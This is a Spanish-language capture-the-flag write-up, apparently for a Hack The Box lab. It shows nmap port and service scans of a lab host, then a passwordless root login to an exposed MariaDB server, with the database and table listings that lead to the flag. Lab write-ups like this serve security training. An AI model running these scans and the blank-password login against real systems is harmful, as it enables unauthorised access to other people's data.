🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.170.118

PING 10.129.170.118 (10.129.170.118) 56(84) bytes of data.
64 bytes from 10.129.170.118: icmp_seq=1 ttl=63 time=1159 ms

--- 10.129.170.118 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1158.846/1158.846/1158.846/0.000 ms
```

> Sistema operativo:  **Linux**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vv 10.129.170.118 -oG openPorts

PORT     STATE SERVICE REASON
3306/tcp open  mysql   syn-ack ttl 63
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 3306 -sCV 10.129.170.118 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 11:52 -03
Nmap scan report for 10.129.170.118
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
3306/tcp open  mysql?
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: 65
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolOld, SupportsCompression, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, IgnoreSigpipes, Support41Auth, FoundRows, InteractiveClient, Speaks41ProtocolNew, LongColumnFlag, SupportsTransactions, ODBCClient, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: WpQ!MCGyO[^F$|gp|Aiq
|_  Auth Plugin Name: mysql_native_password
```

| Puerto | Servicio | Versión                         |
| ------ | -------- | ------------------------------- |
| 3306   | mysql    | 5.5.5-10.3.27-MariaDB-0+deb10u1 |

¿Qué es mysql?  
[https://www.mysql.com/](https://www.mysql.com/)

🗹 Acceder a la base de datos **mysql**:

```shell
mysql -u root -h 10.129.170.118 -P 3306

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 78
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.155 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.187 sec)

MariaDB [htb]> select * from config;
```
## Flag

La flag se encuentra en la base de datos **htb** y tabla **config**.